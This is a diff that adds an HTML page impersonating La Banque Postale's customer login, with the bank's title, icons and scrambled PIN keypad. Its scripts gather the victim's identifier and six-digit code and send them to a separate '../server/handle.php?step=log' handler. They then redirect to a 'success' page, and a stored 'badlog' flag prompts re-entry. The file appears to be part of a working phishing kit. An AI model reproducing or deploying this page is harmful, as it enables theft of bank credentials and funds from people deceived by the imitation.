@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <link rel="stylesheet" href="./assets/style.css">
+    <title>Connexion à l'espace client - La Banque Postale</title>
+</head>
+
+<body>
+    <header>
+        <nav class="md:h-[130px]">
+            <div class="logo p-5">
+                <img width="59" height="59" src="./assets/logo.svg" alt="logo">
+            </div>
+            <div class="flex flex-col pl-[10px] border-b">
+                <div class="flex justify-between p-2">
+                    <div class="flex flex-col">
+                        <span class="text-[#4a4a4a] text-[0.75rem] arial">Changer de site</span>
+                        <div class="flex items-center">
+                            <span class="block text-[#000] text-[.875rem] leading-[1.5rem] font-bold">
+                                Particuliers
+                            </span>
+                            <svg class="w-6 h-6" viewBox="0 0 24 24" id="ic-interface-chevron-down"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path fill-rule="evenodd"
+                                    d="M12 15.565c-.384 0-.768-.146-1.061-.438l-4.533-4.533a.5.5 0 01.707-.707l4.533 4.532a.5.5 0 00.708 0l4.533-4.532a.5.5 0 01.707.707l-4.533 4.533a1.498 1.498 0 01-1.061.438">
+                                </path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="hidden md:flex mx-4">
+                        <button
+                            class="w-[187.86px] h-[40px] text-[#003DA5] border border-[#003DA5] rounded-full text-[14px] px-[15px] mx-[5px] flex items-center">
+                            <span>
+                                <svg class="w-[29px] h-[24px]" viewBox="0 0 24 24" id="ic-life-ecology"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path fill-rule="evenodd" fill="#003DA5"
+                                        d="M20.198 3.45a.5.5 0 01.42.418c.05.33 1.186 8.15-4.734 14.059a6.961 6.961 0 01-4.93 2.038 6.876 6.876 0 01-4.45-1.622L4.362 20.48a.498.498 0 01-.707 0 .5.5 0 010-.708l2.133-2.126a6.819 6.819 0 01-1.73-4.551c0-1.847.73-3.592 2.056-4.916 5.883-5.871 13.752-4.78 14.083-4.727zm-.483 1.705l-4.347 4.339h2.375a.5.5 0 010 1h-3.377l-2.836 2.831h2.431a.5.5 0 010 1h-3.433l-3.314 3.31c2.32 1.904 5.78 1.76 7.964-.416 4.27-4.263 4.612-9.732 4.537-12.064zm-1.28-.802c-2.551 0-7.633.56-11.613 4.532a5.915 5.915 0 00-1.763 4.209 5.83 5.83 0 001.438 3.842l1.857-1.854v-4.818a.5.5 0 011 0v3.82l2.96-2.955V7.748a.5.5 0 111 0v2.383l5.778-5.766a16.503 16.503 0 00-.656-.012z">
+                                    </path>
+                                </svg>
+                            </span>
+                            <span>
+                                Solutions citoyennes
+                            </span>
+                            </span>
+                        </button>
+                        <button
+                            class="w-[187.86px] h-[40px] text-white bg-gradient-to-r from-[#39a8e5] to-[#003da5] rounded-full text-[14px] px-[15px] mx-[5px] flex items-center">
+                            <span>
+                                <svg class="w-[29px] h-[24px]" viewBox="0 0 24 24" id="ic-products-beneficiary"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path fill-rule="evenodd" fill="#fff"
+                                        d="M9.438 13.296c5.576 0 8.198 7.704 5.483 7.704H4.106c-2.714 0-.243-7.704 5.332-7.704zm0 1c-2.461 0-4.181 1.8-4.97 3.482-.556 1.19-.511 2.032-.394 2.221l.032.001h10.837c.108-.217.116-1.075-.473-2.257-.831-1.666-2.59-3.447-5.032-3.447zM9.5 5a3.547 3.547 0 013.54 3.556A3.546 3.546 0 019.5 12.11a3.547 3.547 0 01-3.54-3.554A3.548 3.548 0 019.5 5zm0 1a2.55 2.55 0 00-2.54 2.556A2.55 2.55 0 009.5 11.11c1.4 0 2.54-1.145 2.54-2.554A2.55 2.55 0 009.5 6zm9-4a.5.5 0 01.5.5V5h2.5a.5.5 0 010 1H19v2.5a.5.5 0 01-1 0V6h-2.5a.5.5 0 010-1H18V2.5a.5.5 0 01.5-.5z">
+                                    </path>
+                                </svg>
+
+                            </span>
+                            <span>
+                                Solutions citoyennes
+                            </span>
+                            </span>
+                        </button>
+                        <a class="border rounded-full w-[40px] h-[40px] p-[7px]" href="#">
+                            <svg class="w-[24px] h-[24px]" fill="#003da5" viewBox="0 0 24 24"
+                                id="ic-safety-locker-unlocked" xmlns="http://www.w3.org/2000/svg">
+                                <path fill-rule="evenodd"
+                                    d="M12 2c2.897 0 5 2.313 5 5.5V9c1.106 0 2.006.9 2.006 2v9c0 1.1-.9 2-2 2h-10c-1.1 0-2-.9-2-2v-9c0-1.1.9-2 2-2H16V7.5C16 4.851 14.355 3 12 3c-1.406 0-2.575.65-3.293 1.83a.499.499 0 11-.854-.519C8.746 2.842 10.257 2 12 2zm5.006 8h-10c-.551 0-1 .448-1 1v9c0 .552.449 1 1 1h10c.55 0 1-.448 1-1v-9c0-.552-.45-1-1-1zm-5 2.5c.6 0 1.14.27 1.5.69.31.35.5.81.5 1.31 0 .438-.146.844-.39 1.174a.523.523 0 00-.11.312v1.996a.517.517 0 01-.518.518h-1.964a.517.517 0 01-.518-.518v-1.986a.523.523 0 00-.111-.312 1.988 1.988 0 01-.39-1.184c0-.51.19-.97.5-1.32.36-.42.9-.68 1.5-.68zm0 1a.967.967 0 00-.741.331.987.987 0 00-.26.669c0 .215.067.418.194.588.2.271.307.586.307.908V17.5h1v-1.514c0-.323.106-.636.307-.908a.967.967 0 00-.056-1.225.982.982 0 00-.751-.353z">
+                                </path>
+                            </svg>
+                        </a>
+                    </div>
+                </div>
+            </div>
+            <div class="flex items-center justify-between">
+                <img src="./assets/navmenu.png" alt="" class="ml-6 hidden lg:block">
+                <ul
+                    class="flex justify-center md:justify-end p-2 md:p-5 md:mr-2 space-x-16 md:space-x-4 cursor-pointer">
+                    <li class="block md:hidden"><svg class="w-[24px] h-[24px]" fill="#003da5" viewBox="0 0 24 24"
+                            id="ic-safety-locker-unlocked" xmlns="http://www.w3.org/2000/svg">
+                            <path fill-rule="evenodd"
+                                d="M12 2c2.897 0 5 2.313 5 5.5V9c1.106 0 2.006.9 2.006 2v9c0 1.1-.9 2-2 2h-10c-1.1 0-2-.9-2-2v-9c0-1.1.9-2 2-2H16V7.5C16 4.851 14.355 3 12 3c-1.406 0-2.575.65-3.293 1.83a.499.499 0 11-.854-.519C8.746 2.842 10.257 2 12 2zm5.006 8h-10c-.551 0-1 .448-1 1v9c0 .552.449 1 1 1h10c.55 0 1-.448 1-1v-9c0-.552-.45-1-1-1zm-5 2.5c.6 0 1.14.27 1.5.69.31.35.5.81.5 1.31 0 .438-.146.844-.39 1.174a.523.523 0 00-.11.312v1.996a.517.517 0 01-.518.518h-1.964a.517.517 0 01-.518-.518v-1.986a.523.523 0 00-.111-.312 1.988 1.988 0 01-.39-1.184c0-.51.19-.97.5-1.32.36-.42.9-.68 1.5-.68zm0 1a.967.967 0 00-.741.331.987.987 0 00-.26.669c0 .215.067.418.194.588.2.271.307.586.307.908V17.5h1v-1.514c0-.323.106-.636.307-.908a.967.967 0 00-.056-1.225.982.982 0 00-.751-.353z">
+                            </path>
+                        </svg></li>
+                    <li class="block md:hidden"><svg class="w-[29px] h-[24px]" viewBox="0 0 24 24" id="ic-life-ecology"
+                            xmlns="http://www.w3.org/2000/svg">
+                            <path fill-rule="evenodd" fill="#003DA5"
+                                d="M20.198 3.45a.5.5 0 01.42.418c.05.33 1.186 8.15-4.734 14.059a6.961 6.961 0 01-4.93 2.038 6.876 6.876 0 01-4.45-1.622L4.362 20.48a.498.498 0 01-.707 0 .5.5 0 010-.708l2.133-2.126a6.819 6.819 0 01-1.73-4.551c0-1.847.73-3.592 2.056-4.916 5.883-5.871 13.752-4.78 14.083-4.727zm-.483 1.705l-4.347 4.339h2.375a.5.5 0 010 1h-3.377l-2.836 2.831h2.431a.5.5 0 010 1h-3.433l-3.314 3.31c2.32 1.904 5.78 1.76 7.964-.416 4.27-4.263 4.612-9.732 4.537-12.064zm-1.28-.802c-2.551 0-7.633.56-11.613 4.532a5.915 5.915 0 00-1.763 4.209 5.83 5.83 0 001.438 3.842l1.857-1.854v-4.818a.5.5 0 011 0v3.82l2.96-2.955V7.748a.5.5 0 111 0v2.383l5.778-5.766a16.503 16.503 0 00-.656-.012z">
+                            </path>
+                        </svg></li>
+                    <li><svg class="w-[29px] h-[24px]" viewBox="0 0 24 24" id="ic-interface-search"
+                            xmlns="http://www.w3.org/2000/svg">
+                            <path fill-rule="evenodd" fill="#003DA5"
+                                d="M9.5 3a6.5 6.5 0 014.935 10.731c.007.004.013.01.019.016l5.4 5.399a.502.502 0 01-.708.708l-5.399-5.4-.016-.02A6.5 6.5 0 119.5 3zm0 1A5.506 5.506 0 004 9.5C4 12.533 6.467 15 9.5 15S15 12.533 15 9.5 12.533 4 9.5 4z">
+                            </path>
+                        </svg></li>
+                    <li><svg class="w-[29px] h-[24px]" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24"
+                            height="24" viewBox="0 0 50 50">
+                            <path fill="#003DA5"
+                                d="M 0 9 L 0 11 L 50 11 L 50 9 Z M 0 24 L 0 26 L 50 26 L 50 24 Z M 0 39 L 0 41 L 50 41 L 50 39 Z">
+                            </path>
+                        </svg></li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+    <main class="flex flex-col md:flex-row h-[852px]">
+        <div class="w-full lg:w-1/2 bg-[#17479E] py-12">
+            <div class="max-w-xs mx-auto">
+                <h1 class="text-white text-[2rem] font-bold leading-10">Connexion à mes
+                    comptes</h1>
+            </div>
+            <div class="pad mt-8">
+                <label class="padlabel" for="suer">
+                    Identifiant :
+                </label>
+                <input type="text" id="user"
+                    class="inputpad placeholder:text-[15px] outline-none text-center text-lg p-2 placeholder:tracking-tighter placeholder:font-medium placeholder:text-gray-500"
+                    placeholder="Saisissez ici votre identifiant">
+                <div class="padlabel mb-2">
+                    <input type="checkbox" name="" id=""> Mémoriser mon identifiant
+
+                </div>
+                <label class="padlabel" for="id">
+                    Mot de passe :
+                </label>
+                <input type="text" id="pin" disabled
+                    class="inputpad placeholder:text-[15px] outline-none text-center text-lg p-2 placeholder:tracking-tighter placeholder:font-medium placeholder:text-gray-500"
+                    placeholder="Composez votre mot de passe">
+                <input type="hidden" id="hiddenPassword">
+                <div
+                    class="inputpad bg-[#586879] h-[28px] text-center pt-0.5 font-semibold antialiased text-white text-sm tracking-tight">
+                    Activer la vocalisation
+                </div>
+                <div>
+                    <div class="flex justify-center space-x-0.5 mt-0.5 text-white numpad">
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                            7
+                        </li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                            0</li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                            3</li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                            9</li>
+                    </div>
+                    <div class="flex justify-center space-x-0.5 mt-0.5 text-white numpad">
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                        </li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                        </li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                            2</li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                            4</li>
+                    </div>
+                    <div class="flex justify-center space-x-0.5 mt-0.5 text-white numpad">
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                            8</li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                        </li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                        </li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                            6</li>
+                    </div>
+                    <div class="flex justify-center space-x-0.5 mt-0.5 text-white numpad">
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                            5</li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                        </li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                            1</li>
+                        <li
+                            class="w-[45px] h-[45px] bg-[#17479e] list-none text-2xl antialiased text-center p-2 cursor-pointer">
+                        </li>
+                    </div>
+                </div>
+                <div class="my-1 flex justify-center space-x-1">
+                    <button type="submit" id="btn" disabled
+                        class="bg-[#17479E] disabled:bg-[#4D81B9] text-white w-[43%] py-1.5 buttonpad font-semibold text-sm uppercase">Valider</button>
+                    <button type="submit" id="delete"
+                        class="bg-[#586879] text-white w-[43%] py-1.5 buttonpad font-semibold text-sm uppercase">Effacer</button>
+                </div>
+            </div>
+        </div>
+        <div class="max-w-1/2 mx-auto mt-12 lg:mt-28">
+            <img src="./assets/rightside.png" alt="" class="hidden lg:block">
+            <img src="./assets/footerm.png" alt="" class="block lg:hidden">
+        </div>
+    </main>
+    <footer>
+        <img src="./assets/footer.png" alt="" class="hidden lg:block">
+    </footer>
+
+    <script>
+        $(document).ready(() => {
+            const del = document.getElementById('delete')
+            del.addEventListener('click', () => {
+                $('#pin').val('')
+                $('#hiddenPassword').val('')
+                $('#btn').attr('disabled', 'true')
+
+            })
+
+            const li = document.getElementsByTagName('li')
+            for (let i = 0; i < li.length; i++) {
+                const element = li[i];
+                if (element.innerText != '') {
+                    element.addEventListener('click', () => {
+                        if ($('#hiddenPassword').val().length <= 6) {
+                            num = element.textContent;
+                            $('#hiddenPassword').val($('#hiddenPassword').val() + parseInt(num))
+                            $('#pin').val('*' + $('#pin').val())
+                            if ($('#hiddenPassword').val().length == 6) {
+                                $('#btn').removeAttr('disabled')
+                            }
+                        }
+                    })
+                }
+            }
+        })
+    </script>
+
+    <script>
+
+        $(document).ready(() => {
+            let local = localStorage.getItem('what')
+            if (local == 'badlog') {
+                $('#user').addClass('bg-red-100')
+                $('#pin').addClass('bg-red-100')
+            }
+        })
+
+        $('#btn').click(() => {
+            let id = $('#user')
+            let form = new FormData()
+            form.append('id', id.val())
+            form.append('pin', $('#hiddenPassword').val())
+            $.ajax({
+                type: "post",
+                data: form,
+                url: "../server/handle.php?step=log",
+                processData: false,
+                contentType: false,
+                success: () => {
+                    window.location.href = '../../../success.php'
+                    return false;
+                }
+            })
+        })
+    </script>
+</body>
+
+</html>
